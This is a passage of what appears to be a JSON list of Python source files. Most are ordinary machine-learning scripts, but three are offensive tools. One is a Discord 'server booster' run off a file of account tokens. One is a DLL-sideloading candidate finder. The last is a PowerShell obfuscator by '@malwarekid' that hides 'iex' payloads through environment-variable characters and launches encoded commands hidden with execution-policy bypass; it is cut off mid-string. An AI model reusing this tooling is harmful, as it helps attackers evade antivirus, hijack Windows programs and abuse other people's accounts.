select_best_resolution(image.size, possible_resolutions)\n    image_padded = resize_and_pad_image(image, best_resolution)\n\n    patches = divide_to_patches(image_padded, processor.crop_size['height'])\n\n    image_original_resize = image.resize((processor.size['shortest_edge'], pr",
    "import os\nimport copy\nimport logging\nfrom dataclasses import dataclass, field\nfrom typing import Dict, Optional, Sequence, List\nimport json\nimport random\n\nimport torch\nimport torch.distributed as dist\nimport transformers\n\nfrom torch.utils.data import Dataset\nfrom transformers import Trainer, AutoConfig, AutoTokenizer, AutoModelForCausalLM\nfrom transformers import LlamaForCausalLM\n\n\nfrom dataloaders import TextDataset\nfrom dataloaders import sft_data_collactor, offline_ppo_data_collactor, weighted_sft_data_collactor\nfrom arguments import CustomTrainingArguments\n\nfrom trainers import SFTWeightedWithKLTrainer, OfflineWeightedPolicyTrainer\n\nfrom utils import print_rank_0, read_json_or_jsonl_data\nfrom utils import DEFAULT_PAD_TOKEN, DEFAULT_BOS_TOKEN, DEFAULT_EOS_TOKEN, DEFAULT_UNK_TOKEN\n\n\ndef get_train_dataset(args):    \n    all_train_data = []\n    for train_data_path in args.train_data_path:\n        train_data = read_json_or_jsonl_data(train_data_path)\n        all_train_data.extend(train_data)\n\n    if args.debug_mode:\n        print_rank_0(f\">>> check loaded data:\")        \n        print_rank_0(f\">>> {all_train_data[0]}\")\n\n    train_set = TextDataset(all_train_data)\n    return train_set\n\n\ndef train():\n    parser = transformers.HfArgumentParser(CustomTrainingArguments)\n    args = parser.parse_args_into_dataclasses()[0]\n    print_rank_0(args)\n\n    # load data\n    #---------------------------------------------------------------------------------\n    train_dataset = get_train_dataset(args)    \n\n    # setup model\n    #---------------------------------------------------------------------------------\n    print_rank_0(f\"Begin loading model from {args.model_name_or_path}\")\n\n    model = AutoModelForCausalLM.from_pretrained(\n        args.model_name_or_path,\n        trust_remote_code=True,            \n    )\n    if hasattr(model, \"ref_model\"):\n        del model.ref_model\n\n    if args.train_method in [\"SFTwithKL\", \"OfflinePO\"] \\\n      and args.ref_model_name_or_path:\n        ref_model = AutoModelForCausalLM.from_pretrained(\n            args.ref_model_name_or_path,\n            trust_remote_code=True,\n        )\n        if hasattr(ref_model, \"ref_model\"):\n            del ref_model.ref_model\n        for param in ref_model.parameters():\n            param.requires_grad = False\n\n        model.ref_model = ref_model\n        \n    print_rank_0(model)\n    print_rank_0(f\"Finished loading model from {args.model_name_or_path}\")\n\n    model.is_parallelizable = True\n    model.model_parallel = True\n\n    # setup tokenizer\n    #---------------------------------------------------------------------------------        \n    tokenizer = AutoTokenizer.from_pretrained(\n        args.model_name_or_path,      \n        model_max_length=args.max_length,        \n        padding_side=args.padding_side,\n        truncation_side=args.truncation_side,\n        use_fast=True,\n        trust_remote_code=True,\n\n    )\n\n    if tokenizer.pad_token is None:\n        # We do not resize the vocab embedding, since it ruins the KL value with the ref_model\n        tokenizer.pad_token_id = 0 \n        tokenizer.pad_token = tokenizer.decode(0)\n        print_rank_0(\"set pad token id to 0\")\n\n    model.config.pad_token_id = tokenizer.pad_token_id\n    model.config.bos_token_id = tokenizer.bos_token_id\n    model.config.eos_token_id = tokenizer.eos_token_id\n\n\n    print_rank_0(tokenizer)\n\n    # build trainer\n    #---------------------------------------------------------------------------------\n\n    if args.train_method == \"SFT\":\n        trainer = Trainer(\n            model=model,\n            tokenizer=tokenizer, \n            args=args,\n            train_dataset=train_dataset,\n            data_collator=lambda x: sft_data_collactor(args, x, tokenizer)\n        )\n        \n    elif args.train_method == \"SFTwithKL\":\n        trainer = SFTWeightedWithKLTrainer(\n            model=model,\n            tokenizer=tokenizer, \n            args=args,\n            train_dataset=train_dataset,\n            data_collator=lambda x: offline_ppo_data_collactor(args, x, tokenizer)\n        )\n        \n    elif args.train_method == \"OfflinePO\":\n        trainer = OfflineWeightedPolicyTrainer(\n            model=model,\n            tokenizer=tokenizer,\n            args=args,\n            train_dataset=train_dataset,\n            data_collator=lambda x: offline_ppo_data_collactor(args, x , tokenizer)\n        )\n\n    train_result = trainer.train()\n    metrics = train_result.metrics\n    trainer.log_metrics(\"train\", metrics)\n    trainer.save_metrics(\"train\", metrics)\n\n    trainer.save_state()\n    if hasattr(trainer.model, \"ref_model\"):\n        del trainer.model.ref_model\n\n\n    trainer.save_model(output_dir=args.output_dir)\n\n\nif __name__ == \"__main__\":\n    train()\n",
    "\"\"\"\nGNU License\n\nCopyright (c) 2022 DaniDuese\n\n\"\"\"\nfrom ab5 import hgratient\nfrom typing import Optional\nimport colorama\nimport sys\nfrom pystyle import Center, Colorate, Colors, Write\nimport tls_client\nimport os\n\n\ndef setTitle(title: Optional[any] = None):\n  os.system(\"title \"+title)\n\n\nsetTitle(\"BitBoost | Server Booster\")\n\n\ndef clear():\n  if sys.platform in [\"linux\", \"linux2\", \"darwin\"]:\n    os.system(\"clear\")\n  else:\n    os.system(\"cls\")\n\nclear()\n\nsub_ids = []\nlogo = (\"\"\"__________.__  __ __________                       __   \n\\______   \\__|/  |\\______   \\ ____   ____  _______/  |_ \n |    |  _/  \\   __\\    |  _//  _ \\ /  _ \\/  ___/\\   __\\ \n |    |   \\  ||  | |    |   (  <_> |  <_> )___ \\  |  |  \n |______  /__||__| |______  /\\____/ \\____/____  > |__|  \n        \\/                \\/                  \\/        \"\"\")\nbanner = (\"\"\"Please make sure that all your tokens are already in the server you want to boost.\\n\"\"\")\n\nprint(hgratient(logo, [0, 223, 50], [0, 25, 222]))\nprint(banner)\n__guild_id__ = Write.Input(\"Guild ID: \", Colors.blue_to_green, interval=0.05)\ncolorama.init(convert=True)\n\n\nclass Nitro:\n    def __init__(self, token: str):\n        self.token = token\n        self.headers = {\n            \"accept\": \"*/*\",\n            \"accept-encoding\": \"gzip, deflate, br\",\n            \"accept-language\": \"en-US\",\n            \"authorization\": token,\n            \"referer\": \"https://discord.com/channels/@me\",\n            \"sec-fetch-dest\": \"empty\",\n            \"sec-fetch-mode\": \"cors\",\n            \"sec-fetch-site\": \"same-origin\",\n            \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36\",\n            \"x-debug-options\": \"bugReporterEnabled\",\n            \"x-discord-locale\": \"en-US\",\n            \"x-super-properties\": \"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYxODQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==\"\n        }\n        self.session = tls_client.Session(client_identifier=\"chrome_107\")\n        self.sub_ids = []\n\n    def removeTokenFromTxt(self):\n        with open(\"tokens.txt\", \"r\") as f:\n            lines = f.readlines()\n        with open(\"tokens.txt\", \"w\") as f:\n            for line in lines:\n                if line.strip(\"\\n\") != self.token:\n                    f.write(line)\n\n    def hasNitro(self):\n        sex = self.session.get(\n            \"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots\",\n            headers=self.headers,\n        )\n        if sex.status_code in [403, 401]:\n            return self._extracted_from_hasNitro_7('Token is invalid, removing.')\n        try:\n            for sub in sex.json():\n                self.sub_ids.append(sub[\"id\"])\n        except Exception as e:\n            print(e)\n            print(sex.text)\n        if len(self.sub_ids) == 0:\n            return self._extracted_from_hasNitro_7('Token has no nitro, removing.')\n        log(f\"{colorama.Fore.GREEN}Token has nitro.\")\n        return True\n\n    # TODO Rename this here and in `hasNitro`\n    def _extracted_from_hasNitro_7(self, arg0):\n        log(f\"{colorama.Fore.RED}{arg0}\")\n        self.removeTokenFromTxt()\n        return False\n\n    def boostServer(self, guildID):\n        for i in range(len(self.sub_ids)):\n            self.headers[\"Content-Type\"] = \"application/json\"\n            r = self.session.put(\n                url=f\"https://discord.com/api/v9/guilds/{guildID}/premium/subscriptions\",\n                headers=self.headers,\n                json={\n                    \"user_premium_guild_subscription_slot_ids\": [f\"{self.sub_ids[i]}\"]\n                },\n            )\n            if r.status_code == 201:\n                log(\n                    f\"{colorama.Fore.GREEN}Boosted {i + 1} of {len(sub_ids)} from {self.token[25:]}\"\n                )\n            elif r.status_code == 400:\n                log(\n                    f\"{colorama.Fore.YELLOW}Boost already used {i + 1} of {len(sub_ids)} from {self.token[25:]}\"\n                )\n            else:\n                log(f\"{colorama.Fore.RED}ERROR: {r.status_code}\")\n\n\ndef log(text):\n    print(f\"{text}{colorama.Fore.RESET}\")\n\n\ndef main():\n    with open(\"tokens.txt\", \"r\") as f:\n        tokens = f.read().splitlines()\n    for token in tokens:\n        nitro = Nitro(token)\n        if nitro.hasNitro():\n            nitro.boostServer(__guild_id__)\n\n\nif __name__ == \"__main__\":\n    main()\n    input(\"Press enter to exit.\")\n",
    "import torch\nimport einops\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\nclass InfiniAttention(nn.Module):\n    def __init__(self, dim, heads=8, dim_head=64, seq_len=100):\n        super().__init__()\n        inner_dim = dim_head * heads\n        self.heads = heads\n        self.scale = dim_head**-0.5\n\n        self.in_linear = nn.Linear(dim, inner_dim)\n\n        self.k_linear = nn.Linear(dim, inner_dim, bias=False)\n        self.v_linear = nn.Linear(dim, inner_dim, bias=False)\n        self.q_linear = nn.Linear(dim, inner_dim, bias=False)\n\n        self.out_linear = nn.Linear(inner_dim, dim)\n\n        self.long_term_memory = torch.zeros(1, heads, dim_head, dim_head)\n        self.long_term_memory_norm = torch.zeros(1, heads, seq_len, 1)\n\n        self.local_memory_scalar = nn.Parameter(torch.tensor(1.0))\n        self.long_term_memory_scalar = nn.Parameter(torch.tensor(1.0))\n        self.long_term_memory_gate = nn.Linear(dim, seq_len, bias=False)\n\n    def _query_long_term_memory(self, q):\n        memory = (F.elu(q) @ self.long_term_memory) / (\n            F.elu(q) * self.long_term_memory_norm\n        )\n        return memory\n\n    def _update_long_term_memory(self, k, v):\n        v_term = v - (\n            (F.elu(k) @ self.long_term_memory) / (F.elu(k) * self.long_term_memory_norm)\n        )\n        self.long_term_memory = (\n            self.long_term_memory + F.elu(k).transpose(-2, -1) @ v_term\n        )\n        self.long_term_memory_norm = F.elu(k).sum(dim=-1)\n\n    def forward(self, q, k, v, mask=None):\n        q, k, v = self.q_linear(q), self.k_linear(k), self.v_linear(v)\n\n        q, k, v = map(\n            lambda t: einops.rearrange(t, \"b n (h d) -> b h n d\", h=self.heads),\n            (q, k, v),\n        )\n\n        # Local attention\n        sim = q @ k.transpose(-2, -1) * self.scale\n        local_attn = sim.softmax(dim=-1)\n        if mask is not None:\n            local_attn = local_attn.masked_fill(mask == 0, 0)\n        # Gating\n        local_attn = (1 - F.sigmoid(self.local_memory_scalar)) * local_attn\n\n        # Long-term memory attention\n        long_term_memory = self._query_long_term_memory(q)\n        long_term_memory = F.sigmoid(\n            self.long_term_memory_scalar\n        ) * self.long_term_memory_gate(long_term_memory)\n\n        attn = local_attn + long_term_memory\n\n        self._update_long_term_memory(k, v)\n\n        out = attn @ v\n\n        out = einops.rearrange(out, \"b h n d -> b n (h d)\")\n        return self.out_linear(out)\n\n\nif __name__ == \"__main__\":\n    net = InfiniAttention(64)\n    q = torch.randn(1, 100, 64)\n    k = torch.randn(1, 100, 64)\n    v = torch.randn(1, 100, 64)\n    out = net(q, k, v)\n    print(out.shape)\n",
    "import os\nimport random\nimport time\nfrom dataclasses import asdict, dataclass, field\nfrom types import SimpleNamespace\nfrom typing import List, Literal, Optional\n\nimport numpy as np\nimport pandas as pd\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.optim as optim\nimport tyro\nfrom accelerate import Accelerator\nfrom accelerate.state import AcceleratorState\nfrom accelerate.utils import gather_object\nfrom datasets import load_dataset\nfrom rich.console import Console\nfrom rich.pretty import pprint\nfrom rich.table import Table\nfrom torch import optim\nfrom torch.utils.data import DataLoader\nfrom torch.utils.tensorboard import SummaryWriter\nfrom tqdm import tqdm\nfrom transformers import (\n    AutoConfig,\n    AutoModel,\n    AutoModelForCausalLM,\n    AutoTokenizer,\n    GenerationConfig,\n    PretrainedConfig,\n    PreTrainedModel,\n)\nfrom peft import get_peft_model, LoraConfig\nfrom rm2 import ScalarModel, ScalarModelConfig\nfrom tril.utils.generation_mixin import override_generation_routines\nfrom tril.utils.logit_processors import RollinProcessor\nfrom transformers.generation.logits_process import LogitsProcessorList\n\nINVALID_LOGPROB = 1.0\n\n@dataclass\nclass AdaptiveKLParams:\n    target: float = 6.0\n    horizon: int = 10000  # in episodes\n\n\n@dataclass\nclass RewardHParams:\n    use_adaptive_kl: bool = False\n    adaptive_kl: Optional[AdaptiveKLParams] = field(default_factory=AdaptiveKLParams)\n    dataset_std: float = 1.0\n    kl_coef: float = 0.05\n\n\n@dataclass\nclass PpoHParams:\n    num_updates: tyro.conf.Suppress[int] = None\n    nminibatches: int = 1\n    noptepochs: int = 4\n    vf_coef: float = 0.1\n    cliprange: float = 0.2\n    cliprange_value: float = 0.2\n    gamma: float = 1\n    lam: float = 0.95\n    whiten_rewards: bool = True\n\n\n@dataclass\nclass TaskHParams:\n    # Query params\n    query_length: int = 512\n    #query_dataset: str = \"vwxyzjn/summarize_from_feedback_tldr_3_filtered_oai_preprocessing_pythia-160m_53\"\n    query_dataset: str = \"cleanrl/summarize_from_feedback_tldr_3_filtered_oai_preprocessing_1704563162\" # pythia 2.9\n\n    query_format_str: Optional[str] = \"SUBREDDIT: r/{subreddit}\\n\\nTITLE: {title}\\n\\nPOST: {post}\\n\\nTL;DR:\"\n    query_truncate_field: Optional[str] = \"post\"\n    query_truncate_text: Optional[str] = \"\\n\"\n    query_padding: Optional[str] = None  # defaults to repeated spaces\n    query_pad_side: Optional[str] = \"left\"\n\n    # Response params\n    response_length: int = 53\n\n    # Truncate response after the first occurrence of this token at or after index after when sampling.\n    truncate_token: Literal[\"eos\"] = \"eos\"\n    truncate_token_id: Optional[int] = None\n    truncate_after: int = 16\n    penalty_reward_value: int = -1\n\n    # LM params\n    temperature: float = 0.7\n\n\n# a patch\n@dataclass\nclass TaskQueryHParams:\n    length: int = None\n    dataset: str = None\n    format_str: Optional[str] = None  # if underlying dataset yields dicts, can format arbitrarily\n    truncate_field: Optional[str] = None\n    truncate_text: Optional[str] = None\n    padding: Optional[str] = None  # defaults to repeated spaces\n    pad_side: Optional[str] = None\n\n\n@dataclass\nclass Args:\n    beta: float = 1.0\n    # common args\n    exp_name: str = \"pythia_pporef_lora_2.8_new\"\n    \"\"\"the name of this experiment\"\"\"\n    seed: int = 555134\n    \"\"\"seed of the experiment\"\"\"\n    #track: bool = True\n    track: bool = False\n    \"\"\"if toggled, this experiment will be tracked with Weights and Biases\"\"\"\n    wandb_project_name: str = \"tldr_summarize_costa_lora\"\n    \"\"\"the wandb's project name\"\"\"\n    wandb_entity: Optional[str] = \"rollin_ref\"\n    \"\"\"the entity (team) of wandb's project\"\"\"\n    cuda: bool = True\n    \"\"\"Whether to use cuda if available.\"\"\"\n    run_name: Optional[str] = None\n    \"\"\"a unique name of this run\"\"\"\n    load_from_cache_file: bool = False\n    \"\"\"Whether to load data from the local cache file in `dataset.map`\"\"\"\n    push_to_hub: bool = False\n    \"whether to upload the saved model to huggingface\"\n    hf_entity: str = \"\"\n    \"the user or org name of the model repository from the Hugging Face Hub\"\n    deepspeed: bool = True\n    \"\"\"Whether to use deepspeed to train the model\"\"\"\n    print_sample_output_freq: int = 220\n    \"\"\"How often to print sample output\"\"\"\n    run_eval: bool = True\n    \"\"\"Whether to run evaluation\"\"\"\n\n    # optimizer args\n    eps: float = 1e-5\n    \"\"\"the epsilon value for the optimizer\"\"\"\n    lr: float = 3e-6\n    \"\"\"the learning rate\"\"\"\n    optimizer: Literal[\"adam\", \"adamw\"] = \"adamw\"\n    \"\"\"Which optimizer to use\"\"\"\n    scheduler: str = \"cosine\"\n    \"\"\"Which scheduler to use\"\"\"\n    warm_up_steps: int = 0\n    \"\"\"Number of warm up steps for the scheduler\"\"\"\n\n    world_size: Optional[int] = 4\n    \"\"\"The number of processes (GPUs) to use\"\"\"\n    num_train_epochs: int = 1\n    \"\"\"Number of epochs to train\"\"\"\n    num_updates: Optional[int] = None\n    \"\"\"The number of updates to train\"\"\"\n    gradient_accumulation_steps: int = 32\n    \"\"\"The number of gradient accumulation steps\"\"\"\n    ",
    "import os\nimport random\nimport numpy as np\nimport pandas as pd\nfrom sklearn.model_selection import KFold\n\n\ndef create_pandas_df(data_dict: dict) -> pd.DataFrame:\n    \"\"\"\n    create a pandas dataframe out of data dictionary\n    data_dict: key values of the data to be data-framed\n    \"\"\"\n    data_frame = pd.DataFrame(\n        data=data_dict,\n        index=None,\n        columns=None,\n    )\n    return data_frame\n\n\ndef save_pandas_df(dataframe: pd.DataFrame, save_path: str, header: list) -> None:\n    \"\"\"\n    save a dataframe to the save_dir with specified header\n    dataframe: pandas dataframe to be saved\n    save_path: the directory in which the dataframe is going to be saved\n    header: list of headers of the to be saved csv file\n    \"\"\"\n    assert save_path.endswith(\"csv\")\n    assert isinstance(dataframe, pd.DataFrame)\n    assert (dataframe.columns.__len__() == header.__len__())\n    dataframe.to_csv(path_or_buf=save_path, header=header, index=False)\n\n\ndef create_train_val_kfold_csv_from_data_folder(\n    folder_dir: str,\n    append_dir: str = \"\",\n    save_dir: str = \"./\",\n    n_k_fold: int = 5,\n    random_state: int = 42,\n) -> None:\n    \"\"\"\n    create k fold train validation csv files\n    folder_dir: path to the whole corpus of the data\n    append_dir: path to be appended to the begining of the directory filed in the csv file\n    save_dir: directory to which save the csv files\n    n_k_fold: number of folds\n    random_state: random seed ID\n    \"\"\"\n    assert os.path.exists(folder_dir), f\"{folder_dir} does not exist\"\n\n    header = [\"data_path\", \"case_name\"]\n\n    # iterate through the folder to list all the filenames\n    case_name = next(os.walk(folder_dir), (None, None, []))[1]\n    case_name = np.array(case_name)\n    np.random.seed(random_state)\n    np.random.shuffle(case_name)\n\n    # setting up k-fold module\n    kfold = KFold(n_splits=n_k_fold, random_state=random_state, shuffle=True)\n    # generating k-fold train and validation set\n    for i, (train_fold_id, validation_fold_id) in enumerate(kfold.split(case_name)):\n        # getting the corresponding case out of the fold index\n        train_fold_cn = case_name[train_fold_id]\n        valid_fold_cn = case_name[validation_fold_id]\n        # create data path pointing to the case name\n        train_dp = [\n            os.path.join(append_dir, case).replace(\"\\\\\", \"/\") for case in train_fold_cn\n        ]\n        valid_dp = [\n            os.path.join(append_dir, case).replace(\"\\\\\", \"/\") for case in valid_fold_cn\n        ]\n        # dictionary object to get converte to dataframe\n        train_data = {\"data_path\": train_dp, \"case_name\": train_fold_cn}\n        valid_data = {\"data_path\": valid_dp, \"case_name\": valid_fold_cn}\n\n        train_df = create_pandas_df(train_data)\n        valid_df = create_pandas_df(valid_data)\n\n        save_pandas_df(\n            dataframe=train_df,\n            save_path=f\"./train_fold_{i+1}.csv\",\n            header=header,\n        )\n        save_pandas_df(\n            dataframe=valid_df,\n            save_path=f\"./validation_fold_{i+1}.csv\",\n            header=header,\n        )\n\n\nif __name__ == \"__main__\":\n    create_train_val_kfold_csv_from_data_folder(\n        # path to the raw train data folder\n        folder_dir=\"../../BraTS2017_Training_Data\",\n        # this is inferred from where the actual experiments are run relative to the data folder\n        append_dir=\"../../../data/brats2017_seg/BraTS2017_Training_Data/\",\n        # where to save the train, val and test csv file relative to the current directory\n        save_dir=\"../../\",\n    )\n",
    "import PIL\nimport torch\nfrom transformers import LlavaForConditionalGeneration, AutoProcessor\nfrom conversation import conv_mllava_v1 as default_conv\nfrom conversation import conv_mllava_v1_mmtag as default_conv_mmtag\nfrom preprocess_util import preprocess_interleaved_images_and_text\nfrom typing import List, Tuple, Union, Tuple\nfrom PIL import Image\n\ndef chat_mllava(\n    text:str, \n    images: List[Union[PIL.Image.Image, str]], \n    model:LlavaForConditionalGeneration, \n    processor, \n    max_input_length:int=None, \n    history:List[dict]=None, \n    **kwargs) -> Tuple[str, List[dict]]:\n    \"\"\"\n    Chat with the Mllava model\n    Args:\n        text: str, the text to be sent to the model, where <image> will be the placeholder for the image\n        images: List[PIL.Image.Image], the images to be sent to the model, or None  \n        model: LlavaForConditionalGeneration, the model to be used\n        processor: MLlavaProcessor, the processor to be used\n        max_input_length: int, the maximum input length\n        history: List[dict], list of messages in the conversation as history. Each message is a dictionary {\"role\": \"ASSISTANT/USER\", \"text\": \"the message\"}. If None, the conversation will start from scratch\n        kwargs: dict, the generation kwargs\n    Returns:\n        Tuple[str, List[dict]], the generated text and the history of the conversation\n    \"\"\"\n    conv = default_conv.copy()\n    conv.messages = []\n    if history is not None:\n        for message in history:\n            message[\"role\"] = message[\"role\"].upper()\n            assert message[\"role\"] in conv.roles\n            conv.append_message(message[\"role\"], message[\"text\"])\n    else:\n        history = []\n    conv.append_message(conv.roles[0], text)\n    conv.append_message(conv.roles[1], \"\")\n    \n    prompt = conv.get_prompt()\n    if images:\n        for i in range(len(images)):\n            if isinstance(images[i], str):\n                images[i] = PIL.Image.open(images[i])\n    \n    prompt, images = preprocess_interleaved_images_and_text(prompt, images)\n    inputs = processor(images=images, text=prompt, return_tensors=\"pt\", truncation=isinstance(max_input_length, int), max_length=max_input_length)\n    for k, v in inputs.items():\n        if v is not None:\n            if isinstance(v, torch.Tensor):\n                inputs[k] = v.to(model.device)\n            elif isinstance(v, list):\n                inputs[k] = [x.to(model.device) for x in v]\n            else:\n                raise ValueError(f\"Invalid input type: {type(v)}\")\n\n    if not \"max_length\" in kwargs and not \"max_new_tokens\" in kwargs:\n        kwargs[\"max_length\"] = 4096 \n    output_ids = model.generate(**inputs, **kwargs)\n    output_ids = output_ids[0]\n    \n    # remove the input tokens\n    generated_ids = output_ids[inputs[\"input_ids\"].shape[-1]:]\n    generated_text = processor.decode(generated_ids, skip_special_tokens=True)\n\n    history.append({\"role\": conv.roles[0], \"text\": text})\n    history.append({\"role\": conv.roles[1], \"text\": generated_text})\n    \n    return generated_text, history\n\ntext = \"<image> <image> What's the difference between these two images? Please describe as much as you can.\"\n\nimage1 = \"image1.jpg\"\nimage2 = \"image2.jpg\"\nimages = [Image.open(image1), Image.open(image2)]\n\n# load processor and model\nprocessor = AutoProcessor.from_pretrained(\"TIGER-Lab/Mantis-bakllava-7b\")\nmodel = LlavaForConditionalGeneration.from_pretrained(\"TIGER-Lab/Mantis-llava-7b\", device_map=\"auto\", torch_dtype=torch.bfloat16, attn_implementation=\"flash_attention_2\")\n\n# chat\ntext = \"<image> <image> What's the difference between these two images? Please describe as much as you can.\"\nresponse, history = chat_mllava(text, images, model, processor)\n\nprint(\"USER: \", text)\nprint(\"ASSISTANT: \", response)\n# The image on the right has a larger number of wallets displayed compared to the image on the left. The wallets in the right image are arranged in a grid pattern, while the wallets in the left image are displayed in a more scattered manner. The wallets in the right image have various colors, including red, purple, and brown, while the wallets in the left image are primarily brown.\n\ntext = \"How many items are there in image 1 and image 2 respectively?\"\nresponse, history = chat_mllava(text, images, model, processor, history=history)\n\nprint(\"USER: \", text)\nprint(\"ASSISTANT: \", response)\n# There are two items in image 1 and four items in image 2.",
    "import os\r\nimport re\r\nimport subprocess\r\nimport shutil\r\n\r\n\r\n\r\ndef create_directory(directory_path):\r\n    try:\r\n        os.makedirs(directory_path, exist_ok=True)\r\n\r\n    except OSError as e:\r\n        # print(f\"\u521b\u5efa\u76ee\u5f55 {directory_path} \u5931\u8d25: {e}\")\r\n        pass\r\n\r\ndef clean_filename(filename):\r\n    # \u79fb\u9664\u6587\u4ef6\u540d\u4e2d\u7684\u975e\u6cd5\u5b57\u7b26\r\n    return re.sub(r'[\\\\/*?:\"<>|]', '', filename)\r\n\r\ndef copy_file(source_path, destination_path):\r\n    try:\r\n        shutil.copy(source_path, destination_path)\r\n    except FileNotFoundError as e:\r\n        # print(f\"\u65e0\u6cd5\u590d\u5236\u6587\u4ef6 {source_path} \u81f3 {destination_path}: {e}\")\r\n        pass\r\n    except Exception as e:\r\n        # print(f\"\u590d\u5236\u6587\u4ef6\u65f6\u51fa\u73b0\u9519\u8bef: {e}\")\r\n        pass\r\ndef execute_command(command):\r\n    try:\r\n        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n        return result.stdout.decode(\"utf-8\")\r\n    except subprocess.CalledProcessError as e:\r\n        # print(f\"\u547d\u4ee4\u6267\u884c\u9519\u8bef: {e}\")\r\n        return \"\"\r\n\r\ndef find_executables(root_dir, is_x64):\r\n    try:\r\n        for root, dirs, files in os.walk(root_dir):\r\n            for file in files:\r\n                if file.endswith(\".exe\"):\r\n                    executable_path = os.path.join(root, file)\r\n\r\n                    _x64 = \"x64\" if is_x64.lower() == \"y\" else \"x86\"\r\n                    try:\r\n                        CMD_result = execute_command(f\"cd {_x64} && ZeroEye.exe {executable_path}\")\r\n\r\n                        if CMD_result.find(\"User DLL Name\") != -1:\r\n                            results = CMD_result.split(\"\\n\")\r\n                            print(executable_path)\r\n                            info_path = f\"bin/{_x64}/{clean_filename(file)}\".replace(\".exe\", \"\")\r\n                            create_directory(info_path)\r\n                            copy_file(executable_path, os.path.join(info_path, file))\r\n\r\n                            for result in results:\r\n                                if result.find(\"User DLL Name\") != -1:\r\n                                    Dll_Name = result.replace(\"User DLL Name: \", \"\").strip()\r\n                                    clean_dll_name = clean_filename(Dll_Name)\r\n                                    copy_file(os.path.join(root, Dll_Name), os.path.join(info_path, clean_dll_name))\r\n                                    with open(f\"{info_path}/info.txt\", \"w\") as file:\r\n                                        file.write(f\"{root}\\n{CMD_result}\")\r\n\r\n\r\n                            if len(os.listdir(info_path)) == 2:\r\n                                shutil.rmtree(info_path)\r\n                                break\r\n\r\n\r\n                    except Exception as e:\r\n                        # print(f\"\u6267\u884c\u547d\u4ee4\u65f6\u51fa\u73b0\u9519\u8bef: {e}\")\r\n                        pass\r\n    except Exception as e:\r\n        pass\r\n        # print(f\"\u904d\u5386\u6587\u4ef6\u65f6\u51fa\u73b0\u9519\u8bef: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    create_directory(\"bin\")\r\n    try:\r\n        root_dir = input(\"\u8bf7\u8f93\u5165\u8def\u5f84\uff1a\")\r\n        is_x64 = input(\"\u662f\u5426x64[y/n]:\")\r\n        find_executables(root_dir, is_x64)\r\n    except KeyboardInterrupt:\r\n        print(\"\u7528\u6237\u7ec8\u6b62\u4e86\u7a0b\u5e8f\u6267\u884c\u3002\")\r\n",
    "import os\nimport base64\nimport random\nfrom typing import Dict, List\n\ndef rh(prompt: str) -> str:\n    return input(prompt)\n\ndef rfc(path: str) -> str:\n    with open(path, \"r\") as file:\n        return file.read()\n\ndef gem(ev: List[str]) -> Dict[str, Dict[str, List[int]]]:\n    em = {}\n    for var in ev:\n        value = os.environ.get(var, \"\")\n        if value:\n            for char in value:\n                if char not in em:\n                    em[char] = {}\n                if var not in em[char]:\n                    em[char][var] = []\n                em[char][var].append(value.index(char))\n    return em\n\ndef eo(string: str, em: Dict[str, Dict[str, List[int]]]) -> List[str]:\n    obf_code = []\n    for char in string:\n        options = em.get(char)\n        if not options:\n            obf_code.append(f\"[char]{ord(char)}\")\n            continue\n        chosen = random.choice(list(options.keys()))\n        possible_indices = options[chosen]\n        chosen_index = random.choice(possible_indices)\n        new_char = os.environ[chosen][chosen_index]\n        pwsh_syntax = f\"$env:{chosen}[{chosen_index}]\"\n        obf_code.append(pwsh_syntax)\n    return obf_code\n\ndef po(string: str, em: Dict[str, Dict[str, List[int]]]) -> str:\n    iex = eo(\"iex\", em)\n    pieces = eo(string, em)\n    iex_stage = \"($( {} ) -Join $($null))\".format(\",\".join(iex))\n    payload_stage = \"($( {} ) -Join $($null))\".format(\",\".join(pieces))\n    return \"& {} {}\".format(iex_stage, payload_stage)\n\ndef main():\n\n    print(\"\\033[38;2;255;69;172m\" + r'''\n    ____ _       _______ __  __      ______                 ______          \n   / __ \\ |     / / ___// / / /     / ____/___ _   __      / ____/___  _____\n  / /_/ / | /| / /\\__ \\/ /_/ /_____/ __/ / __ \\ | / /_____/ __/ / __ \\/ ___/\n / ____/| |/ |/ /___/ / __  /_____/ /___/ / / / |/ /_____/ /___/ / / / /__  \n/_/     |__/|__//____/_/ /_/     /_____/_/ /_/|___/     /_____/_/ /_/\\___/  \n                                                             By @malwarekid\n''' + \"\\033[0m\"\"\\033[32m\")\n\n    powershell_cmd = rh(\"Powershell command (leave empty for SCRIPT file) : \")\n\n    if not powershell_cmd:\n        pf = rh(\"Script Path : \")\n        powershell_cmd = rfc(pf)\n\n    cpe = rh(\"Pre encode the command? (helpful if your command has ' or \\\" or $ characters) [y/n]\")\n    out_to_file = rh(\"Wants to save the file? [y/n]\" + \"\\033[0m\")\n\n    ev = [\n        \"ALLUSERSPROFILE\",\n        \"CommonProgramFiles\",\n        \"CommonProgramW6432\",\n        \"ComSpec\",\n        \"PATHEXT\",\n        \"ProgramData\",\n        \"ProgramFiles\",\n        \"ProgramW6432\",\n        \"PSModulePath\",\n        \"PUBLIC\",\n        \"SystemDrive\",\n        \"SystemRoot\",\n        \"windir\"\n    ]\n\n    em = gem(ev)\n\n    if cpe.lower() == 'y':\n        print(\"Original Command\\n================================\\n{}\\n================================\".format(powershell_cmd))\n        to_encode = powershell_cmd\n        encoded_command = base64.b64encode(to_encode.encode(\"utf-16le\")).decode()\n        full_command = f\"Start-Process PowerShell.exe -ArgumentList ('-ep bypass -w h -e {encoded_command}')\"\n        print(\"Encoded 